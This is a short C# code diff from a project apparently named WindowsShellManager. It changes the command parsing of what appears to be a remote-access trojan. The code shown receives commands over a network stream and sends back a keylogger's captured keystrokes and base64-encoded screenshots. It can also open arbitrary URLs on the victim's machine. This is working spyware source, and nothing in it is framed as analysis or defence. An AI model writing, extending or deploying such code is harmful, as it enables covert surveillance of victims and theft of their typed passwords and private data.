@@ -39,27 +39,30 @@ namespace WindowsShellManager
                         }
 
                         String decodedData = System.Text.Encoding.ASCII.GetString(data, 0, dataLength);
+                        String[] command = decodedData.Split('|');
+                        command[0] = command[0].ToUpper();
+
+
 
                         Console.WriteLine("Received: {0}", decodedData);
-                        if (decodedData.ToUpper() == "SENDKCAPTURE")
+                        if (command[0] == "SENDKCAPTURE")
                         {
                             Console.WriteLine("Sending Data...");
 
-                            byte[] msg = Encoding.ASCII.GetBytes("DATA" + features.KeyLogger.KeyLog);
+                            byte[] msg = Encoding.ASCII.GetBytes("DATA|" + features.KeyLogger.KeyLog);
                             features.KeyLogger.KeyLog = String.Empty;
                             SendData(stream, msg);
                         }
-                        else if (decodedData.ToUpper() == "SCREENSHOT")
+                        else if (command[0] == "SCREENSHOT")
                         {
                             Image bmp = new features.ScreenCapture().CaptureScreen();
                             string image = Helpers.helper.ImageToBase64(bmp);
-                            byte[] msg = Encoding.ASCII.GetBytes("IMAGE" + image);
+                            byte[] msg = Encoding.ASCII.GetBytes("IMAGE|" + image);
                             SendData(stream, msg);
                             bmp.Dispose();
                         }
-                        else if (decodedData.ToUpper().StartsWith("OPENSITE"))
+                        else if (command[0] == "OPENSITE")
                         {
-                            string[] command = decodedData.Split('|');
                             System.Diagnostics.Process.Start("http://" + command[1]);
                         }
                         else if (decodedData.ToUpper() == "DISCONNECT")
